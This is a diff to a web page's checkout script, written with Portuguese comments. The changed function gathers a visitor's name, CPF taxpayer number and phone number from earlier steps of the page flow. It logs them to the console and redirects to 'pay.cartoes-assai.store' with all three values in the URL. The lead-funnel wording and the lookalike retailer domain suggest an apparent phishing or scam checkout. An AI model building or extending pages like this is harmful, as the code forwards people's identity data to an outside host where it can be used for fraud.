@@ -468,19 +468,32 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
         function redirectCheckout() {
             localStorage.setItem('type', 'up1');
     
-            // Busca os dados do CPF do localStorage (vindos da pasta 4)
-            const dadosCPF = JSON.parse(localStorage.getItem('dadosCPF')) || { 
-                nomeCompleto: "nome do lead", 
-                cpf: "cpf do lead"
+            // Busca os dados do usuário do localStorage (vindos da pasta 4)
+            const dadosUsuario = JSON.parse(localStorage.getItem('dadosUsuario')) || { 
+                NOME: "nome do lead", 
+                CPF: "cpf do lead"
             };
+            
+            // Busca o telefone do localStorage (vindo da pasta 10)
+            const telefone = localStorage.getItem('telefone') || "";
+            
+            // Debug: verifica os dados recuperados
+            console.log('Dados do usuário:', dadosUsuario);
+            console.log('Telefone:', telefone);
             
             // Constrói a URL do Assaí com os parâmetros
             const baseUrl = "https://pay.cartoes-assai.store/rn4RgQvm4DM3wBV";
-            const documentParam = dadosCPF.cpf || "cpf do lead";
-            const nameParam = encodeURIComponent(dadosCPF.nomeCompleto || "nome do lead");
+            const documentParam = dadosUsuario.CPF || "cpf do lead";
+            const nameParam = encodeURIComponent(dadosUsuario.NOME || "nome do lead");
             
-            const finalUrl = `${baseUrl}?document=${documentParam}&name=${nameParam}`;
+            let finalUrl = `${baseUrl}?document=${documentParam}&name=${nameParam}`;
             
+            // Adiciona o telefone se disponível
+            if (telefone) {
+                finalUrl += `&telephone=${encodeURIComponent(telefone)}`;
+            }
+            
+            console.log('URL final:', finalUrl);
             window.location.href = finalUrl;
         }
     </script>
